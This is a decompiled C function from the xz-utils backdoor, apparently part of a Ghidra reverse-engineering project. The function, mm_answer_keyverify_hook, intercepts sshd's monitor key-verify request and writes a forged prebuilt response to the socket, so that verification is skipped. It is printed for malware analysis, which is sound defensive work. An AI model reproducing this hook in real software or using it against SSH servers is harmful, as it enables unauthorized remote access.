// /home/kali/xzre-ghidra/xzregh/108080_mm_answer_keyverify_hook.c
// Function: mm_answer_keyverify_hook @ 0x108080
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyverify_hook(ssh * ssh, int sock, sshbuf * m)
/*
 * AutoDoc: Intercepts the monitor key-verify request and writes the prebuilt response stored in the global context directly to the socket, skipping sshd's verification logic. It is paired with the keyallowed hook so the forged monitor exchange looks legitimate while the backdoor takes over.
 */

#include "xzre_types.h"


int mm_answer_keyverify_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *funcs;
  long lVar1;
  ssize_t sVar2;
  
  if (global_ctx == 0) {
    return 0;
  }
  funcs = *(libc_imports_t **)(global_ctx + 0x10);
  if ((funcs != (libc_imports_t *)0x0) && (lVar1 = *(long *)(global_ctx + 0x20), lVar1 != 0)) {
    if ((*(ushort *)(lVar1 + 0x84) != 0) &&
       ((*(void **)(lVar1 + 0x88) != (void *)0x0 &&
        (sVar2 = fd_write(sock,*(void **)(lVar1 + 0x88),(ulong)*(ushort *)(lVar1 + 0x84),funcs),
        -1 < sVar2)))) {
      **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd8);
      return 1;
    }
    if (funcs->exit != (_func_19 *)0x0) {
      (*funcs->exit)(0);
    }
  }
  return 0;
}

